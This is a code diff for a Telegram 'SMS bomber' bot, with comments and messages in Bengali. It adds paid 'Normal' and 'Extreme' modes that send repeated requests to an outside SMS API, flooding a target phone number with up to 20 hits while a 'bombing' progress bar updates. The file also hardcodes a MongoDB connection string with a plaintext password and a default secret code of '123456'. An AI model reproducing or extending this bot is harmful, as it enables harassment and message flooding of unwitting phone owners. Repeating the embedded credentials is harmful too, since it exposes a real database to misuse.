@@ -35,6 +35,13 @@ ADMIN_ID = 7033711819
 OWNER_USERNAME = "@Dipcb01"
 DEFAULT_SECRET_CODE = "123456"
 
+# 🎯 MODE CONFIGURATION (এখানে কয়েন ও হিটের সংখ্যা পরিবর্তন করতে পারবেন)
+NORMAL_MODE_HITS = 5
+NORMAL_MODE_COST = 1
+
+EXTREME_MODE_HITS = 20
+EXTREME_MODE_COST = 2
+
 NETLIFY_MINI_APP_URL = "https://add-kz35.vercel.app/"
 MONGO_URI = "mongodb+srv://pronoychkrbrt_db_user:hBJgqxOL15n2p8Wu@tg.b4f8v3a.mongodb.net/sms_bomber_bot?retryWrites=true&w=majority&appName=tg"
 
@@ -144,7 +151,7 @@ logger = logging.getLogger(__name__)
 # ===================== MONGODB CONNECTION =====================
 memory_users = {}
 memory_settings = {
-    "api_url": "https://masterapi-sable.vercel.app/send?phone=",
+    "api_url": "https://example.com/send?phone=",
     "channels": ["@hackxo"],
     "co_admins": [],
     "protected_numbers": ["01700000000", "01800000000", "01317087883"],
@@ -211,7 +218,7 @@ def is_number_protected(number):
     p_nums = get_protected_numbers_list()
     return number in p_nums
 
-# 👤 USER STATUS COMPUTATION (for user_status field in DB)
+# 👤 USER STATUS COMPUTATION
 def compute_user_status(user_id):
     if user_id == ADMIN_ID:
         return "main-admin"
@@ -231,7 +238,7 @@ def get_user_data(tg_user):
         "user_id": user_id,
         "username": username,
         "first_name": first_name,
-        "user_status": status_str,  # 🆕 Added user_status in MongoDB schema
+        "user_status": status_str,
         "points": INITIAL_POINTS,
         "is_vip": False,
         "vip_expiry": None,
@@ -252,7 +259,7 @@ def get_user_data(tg_user):
                 {"$set": {
                     "first_name": first_name, 
                     "username": username,
-                    "user_status": status_str  # 🆕 Auto-sync status in DB
+                    "user_status": status_str
                 }},
                 return_document=True
             )
@@ -425,7 +432,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = query.from_user
     if not user: return
     user_id = user.id
-    get_user_data(user)
+    u = get_user_data(user)
     
     if query.data == 'check_join':
         try:
@@ -453,9 +460,133 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await send_join_prompt(update, unjoined, is_error=True)
 
-# ===================== EXCLUSIVE MAIN ADMIN COMMANDS =====================
+    # 🎯 MODE SELECTION INLINE BUTTON HANDLER
+    elif query.data in ['mode_normal', 'mode_extreme']:
+        await query.answer()
+        
+        if user_id not in temp_data or 'number' not in temp_data[user_id]:
+            await query.message.reply_text("❌ বোম্বিং সেশন টাইমআউট হয়ে গেছে! আবার চেষ্টা করুন।", reply_markup=get_main_keyboard(user_id))
+            return
 
-# 1️⃣ SHOW ALL PROTECTED NUMBERS (MAIN ADMIN ONLY)
+        number = temp_data[user_id]['number']
+        is_vip = check_vip_status(user)
+        
+        if query.data == 'mode_normal':
+            amount = NORMAL_MODE_HITS
+            cost = NORMAL_MODE_COST
+        else:
+            amount = EXTREME_MODE_HITS
+            cost = EXTREME_MODE_COST
+
+        total_cost = 0 if is_vip else cost
+
+        if not is_vip and u.get('points', 0) < total_cost:
+            await query.message.reply_text(
+                f"❌ <b>পর্যাপ্ত পয়েন্ট নেই!</b>\n"
+                f"পছন্দকৃত মোডের জন্য প্রয়োজন: <b>{total_cost} Points</b>\n"
+                f"💰 আপনার ব্যালেন্স: <b>{u.get('points', 0)} Points</b>",
+                parse_mode="HTML",
+                reply_markup=get_main_keyboard(user_id)
+            )
+            del temp_data[user_id]
+            return
+
+        if not is_vip and users_col is not None:
+            users_col.update_one({"user_id": user_id}, {"$inc": {"points": -total_cost}}, upsert=True)
+            
+        if users_col is not None:
+            users_col.update_one({"user_id": user_id}, {"$set": {"last_bombing": datetime.now()}}, upsert=True)
+
+        msg = await query.message.edit_text(
+            f"💣 <b>BOMBING IN PROGRESS...</b> ⌛\n\n"
+            f"📱 টার্গেট: <code>{number}</code>\n"
+            f"📊 প্রগ্রেস: <code>[▱▱▱▱▱▱▱▱▱▱]</code> <b>0% (হিট: 0/{amount})</b>\n\n"
+            f"✅ মোট সফল SMS: <b>0</b>\n"
+            f"❌ মোট ব্যর্থ SMS: <b>0</b>",
+            parse_mode="HTML"
+        )
+        
+        total_sent_count = 0
+        total_failed_count = 0
+        last_response = {}
+        st = get_settings()
+        current_api = st.get('api_url', "https://masterapi-sable.vercel.app/send?phone=")
+
+        for i in range(amount):
+            try:
+                api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=30)
+                if api_response.status_code == 200:
+                    response_data = api_response.json()
+                    if isinstance(response_data, str):
+                        response_data = json.loads(response_data)
+                    if isinstance(response_data, dict):
+                        last_response = response_data
+                        sent = int(response_data.get("total_sent", 0))
+                        failed = int(response_data.get("total_failed", 0))
+                        total_sent_count += sent
+                        total_failed_count += failed
+                    else:
+                        total_sent_count += 1
+                else:
+                    total_failed_count += 1
+            except Exception as e:
+                total_failed_count += 1
+                print(f"Error occurred during hit {i+1}: {e}")
+
+            percent = int(((i + 1) / amount) * 100)
+            filled = int(10 * (i + 1) // amount)
+            bar = '▰' * filled + '▱' * (10 - filled)
+
+            try:
+                await msg.edit_text(
+                    f"💣 <b>BOMBING IN PROGRESS...</b> ⌛\n\n"
+                    f"📱 টার্গেট: <code>{number}</code>\n"
+                    f"📊 প্রগ্রেস: <code>[{bar}]</code> <b>{percent}% (হিট: {i+1}/{amount})</b>\n\n"
+                    f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
+                    f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>",
+                    parse_mode="HTML"
+                )
+            except Exception:
+                pass
+
+        total_requests = total_sent_count + total_failed_count
+
+        if users_col is not None:
+            users_col.update_one(
+                {"user_id": user_id},
+                {"$inc": {
+                    "total_bombing": 1,
+                    "total_success": total_sent_count,
+                    "total_failed": total_failed_count,
+                    "total_requests": total_requests
+                }},
+                upsert=True
+            )
+
+        fresh_u = get_user_data(user)
+        creator = last_response.get('creator', 'BCZ Team')
+        service = last_response.get('service', 'Master API Gateway')
+
+        cost_text = "FREE (VIP)" if is_vip else f"{total_cost} Points"
+        balance_text = "VIP Access" if is_vip else f"{fresh_u.get('points', 0)} Points"
+
+        # 🎯 আপডেট করা রেজাল্ট মেসেজ (অনুরোধকৃত ফিল্ডগুলো রিমুভ করা হয়েছে)
+        result_message = (
+            f"✅ <b>বোম্বিং সফলভাবে সম্পন্ন!</b> ✅\n\n"
+            f"📱 টার্গেট: <code>{number}</code>\n"
+            f"💰 খরচ: <b>{cost_text}</b>\n"
+            f"💳 অবশিষ্ট ব্যালেন্স: <b>{balance_text}</b>\n\n"
+            f"🛠 সার্ভিস: <b>{service}</b>\n"
+            f"👨‍💻 Creator: <b>{creator}</b>\n\n"
+            f"📌 আপনার মোট বোম্বিং সেশন: <b>{fresh_u.get('total_bombing', 1)}</b>"
+        )
+        await msg.edit_text(result_message, parse_mode="HTML")
+        await query.message.reply_text("🏠 মেইন মেনুতে ফিরে আসুন", reply_markup=get_main_keyboard(user_id))
+        
+        if user_id in temp_data:
+            del temp_data[user_id]
+
+# ===================== EXCLUSIVE MAIN ADMIN COMMANDS =====================
 async def admin_showpn(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
@@ -472,7 +603,6 @@ async def admin_showpn(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(text, parse_mode="HTML")
 
-# 2️⃣ SHOW ALL CO-ADMINS WITH CHAT ID (MAIN ADMIN ONLY)
 async def admin_showcoadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
@@ -493,7 +623,6 @@ async def admin_showcoadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(text, parse_mode="HTML")
 
-# 3️⃣ SHOW ALL VIP USERS (MAIN ADMIN ONLY)
 async def admin_showvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
@@ -517,7 +646,6 @@ async def admin_showvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(text, parse_mode="HTML")
 
-# 4️⃣ CHANGE SECRET CODE (MAIN ADMIN ONLY)
 async def admin_chn(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
@@ -535,7 +663,6 @@ async def admin_chn(update: Update, context: ContextTypes.DEFAULT_TYPE):
     update_settings({"secret_code": new_code})
     await update.message.reply_text(f"🔑 <b>সিক্রেট কোড সফলভাবে পরিবর্তন হয়েছে!</b>\n\nনতুন কোড: <code>{new_code}</code>", parse_mode="HTML")
 
-# 5️⃣ CUT COINS / POINTS FROM USER (MAIN ADMIN ONLY)
 async def admin_cutcoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id != ADMIN_ID:
@@ -921,12 +1048,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"⏳ <b>স্প্যাম রোধে অপেক্ষা করুন!</b>\n\nআবার বোম্বিং করতে পারবেন: <b>{COOLDOWN_SECONDS - time_passed} সেকেন্ড</b> পর।\n👑 <i>VIP মেম্বারদের ওয়েটিং টাইম নেই!</i>", parse_mode="HTML")
                 return
 
-        if not is_vip and u.get('points', 0) < POINT_PER_HIT:
+        if not is_vip and u.get('points', 0) < NORMAL_MODE_COST:
             await update.message.reply_text(f"❌ <b>পর্যাপ্ত পয়েন্ট নেই!</b>\n💰 ব্যালেন্স: <b>{u.get('points', 0)} Points</b>\n👉 '💰 EARN POINTS' থেকে ফ্রি পয়েন্ট নিন!", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
             return
 
         temp_data[user_id] = {'step': 'awaiting_number'}
-        await update.message.reply_text("📱 <b>START BOMBER</b>\n\nদয়া করে টার্গেট নম্বর দিন:\nউদাহরণ: <code>01XXXXXXXX</code>", parse_mode="HTML", reply_markup=get_back_keyboard())
+        await update.message.reply_text("📞 <b>১১ ডিজিট নাম্বার দিন:</b>", parse_mode="HTML", reply_markup=get_back_keyboard())
         return
 
     elif message == "💰 EARN POINTS":
@@ -1087,135 +1214,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         temp_data[user_id]['number'] = num
-        temp_data[user_id]['step'] = 'awaiting_amount'
-        is_vip = check_vip_status(user)
-        limit_info = "👑 আপনি <b>VIP User</b>! ফ্রিতে ২০ বার হিট করতে পারবেন।" if is_vip else f"📌 আপনার পয়েন্ট দিয়ে সর্বোচ্চ <b>{min(u.get('points', 0) // POINT_PER_HIT, 20)} বার</b> হিট সম্ভব।"
-        await update.message.reply_text(f"✅ নম্বর সেট: <code>{num}</code>\n\n💥 কত বার (হিট) বোম্বিং করবেন?\n{limit_info}", parse_mode="HTML", reply_markup=get_back_keyboard())
+        
+        # 🎯 ছবি অনুযায়ী ইনলাইন বাটন পাঠানো হচ্ছে
+        mode_keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("👎 Elite Mode", callback_data="mode_normal")],
+            [InlineKeyboardButton("🦇 Extreme Mode", callback_data="mode_extreme")]
+        ])
+        
+        await update.message.reply_text(
+            "<b>মোড সিলেক্ট করুন</b>",
+            parse_mode="HTML",
+            reply_markup=mode_keyboard
+        )
         return
-
-    elif step == 'awaiting_amount':
-        try:
-            amount = int(message)
-            is_vip = check_vip_status(user)
-            total_cost = 0 if is_vip else amount * POINT_PER_HIT
-            
-            if amount < 1 or amount > 20:
-                await update.message.reply_text("❌ অ্যামাউন্ট ১-২০ এর মধ্যে হতে হবে!", reply_markup=get_back_keyboard())
-                return
-            
-            if not is_vip and u.get('points', 0) < total_cost:
-                await update.message.reply_text(f"❌ {amount} হিটের জন্য {total_cost} পয়েন্ট লাগবে।", reply_markup=get_back_keyboard())
-                return
-
-            number = temp_data[user_id]['number']
-            
-            if not is_vip:
-                if users_col is not None:
-                    users_col.update_one({"user_id": user_id}, {"$inc": {"points": -total_cost}}, upsert=True)
-                
-            if users_col is not None:
-                users_col.update_one({"user_id": user_id}, {"$set": {"last_bombing": datetime.now()}}, upsert=True)
-            
-            msg = await update.message.reply_text(
-                f"💣 <b>BOMBING IN PROGRESS...</b> ⌛\n\n"
-                f"📱 টার্গেট: <code>{number}</code>\n"
-                f"📊 প্রগ্রেস: <code>[▱▱▱▱▱▱▱▱▱▱]</code> <b>0% (হিট: 0/{amount})</b>\n\n"
-                f"✅ মোট সফল SMS: <b>0</b>\n"
-                f"❌ মোট ব্যর্থ SMS: <b>0</b>",
-                parse_mode="HTML"
-            )
-            
-            total_sent_count = 0
-            total_failed_count = 0
-            last_response = {}
-            st = get_settings()
-            current_api = st.get('api_url', "https://masterapi-sable.vercel.app/send?phone=")
-            
-            for i in range(amount):
-                try:
-                    api_response = await asyncio.to_thread(requests.get, f"{current_api}{number}", timeout=30)
-                    
-                    if api_response.status_code == 200:
-                        response_data = api_response.json()
-
-                        if isinstance(response_data, str):
-                            response_data = json.loads(response_data)
-
-                        if isinstance(response_data, dict):
-                            last_response = response_data
-
-                            sent = int(response_data.get("total_sent", 0))
-                            failed = int(response_data.get("total_failed", 0))
-
-                            total_sent_count += sent
-                            total_failed_count += failed
-                        else:
-                            total_sent_count += 1
-                    else:
-                        total_failed_count += 1
-
-                except Exception as e:
-                    total_failed_count += 1
-                    print(f"Error occurred during hit {i+1}: {e}")
-                
-                percent = int(((i + 1) / amount) * 100)
-                filled = int(10 * (i + 1) // amount)
-                bar = '▰' * filled + '▱' * (10 - filled)
-                
-                try:
-                    await msg.edit_text(
-                        f"💣 <b>BOMBING IN PROGRESS...</b> ⌛\n\n"
-                        f"📱 টার্গেট: <code>{number}</code>\n"
-                        f"📊 প্রগ্রেস: <code>[{bar}]</code> <b>{percent}% (হিট: {i+1}/{amount})</b>\n\n"
-                        f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
-                        f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>",
-                        parse_mode="HTML"
-                    )
-                except Exception:
-                    pass
-
-            total_requests = total_sent_count + total_failed_count
-            
-            if users_col is not None:
-                users_col.update_one(
-                    {"user_id": user_id},
-                    {"$inc": {
-                        "total_bombing": 1,
-                        "total_success": total_sent_count,
-                        "total_failed": total_failed_count,
-                        "total_requests": total_requests
-                    }},
-                    upsert=True
-                )
-            
-            fresh_u = get_user_data(user)
-            creator = last_response.get('creator', 'BCZ Team')
-            service = last_response.get('service', 'Master API Gateway')
-            success_rate = round((total_sent_count / total_requests) * 100, 2) if total_requests > 0 else 0
-            
-            cost_text = "FREE (VIP)" if is_vip else f"{total_cost} Points"
-            balance_text = "VIP Access" if is_vip else f"{fresh_u.get('points', 0)} Points"
-            
-            result_message = (
-                f"✅ <b>বোম্বিং সফলভাবে সম্পন্ন!</b> ✅\n\n"
-                f"📱 টার্গেট: <code>{number}</code>\n"
-                f"💥 হিট সম্পন্ন: <b>{amount} / {amount} বার</b>\n"
-                f"✅ মোট সফল SMS: <b>{total_sent_count}</b>\n"
-                f"❌ মোট ব্যর্থ SMS: <b>{total_failed_count}</b>\n"
-                f"📊 সফলতার হার: <b>{success_rate}%</b>\n"
-                f"📤 মোট রিকোয়েস্ট: <b>{total_requests}</b>\n"
-                f"💰 খরচ: <b>{cost_text}</b>\n"
-                f"💳 অবশিষ্ট ব্যালেন্স: <b>{balance_text}</b>\n\n"
-                f"🛠 সার্ভিস: <b>{service}</b>\n"
-                f"👨‍💻 Creator: <b>{creator}</b>\n\n"
-                f"📌 আপনার মোট বোম্বিং সেশন: <b>{fresh_u.get('total_bombing', 1)}</b>"
-            )
-            await msg.edit_text(result_message, parse_mode="HTML")
-
-            await update.message.reply_text("🏠 মেইন মেনুতে ফিরে আসুন", reply_markup=get_main_keyboard(user_id))
-            if user_id in temp_data: del temp_data[user_id]
-                
-        except ValueError: await update.message.reply_text("❌ ভুল ইনপুট! দয়া করে সংখ্যা দিন।", reply_markup=get_back_keyboard())
 
 # ===================== MAIN FUNCTION =====================
 def main():
@@ -1253,7 +1264,7 @@ def main():
     application.add_handler(CallbackQueryHandler(button_callback))
     
     print("="*50)
-    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH USER_STATUS FIELD ADDED!")
+    print("🤖 MASTER SMS BOMBER BOT IS ONLINE WITH INLINE MODES!")
     print("="*50)
     application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
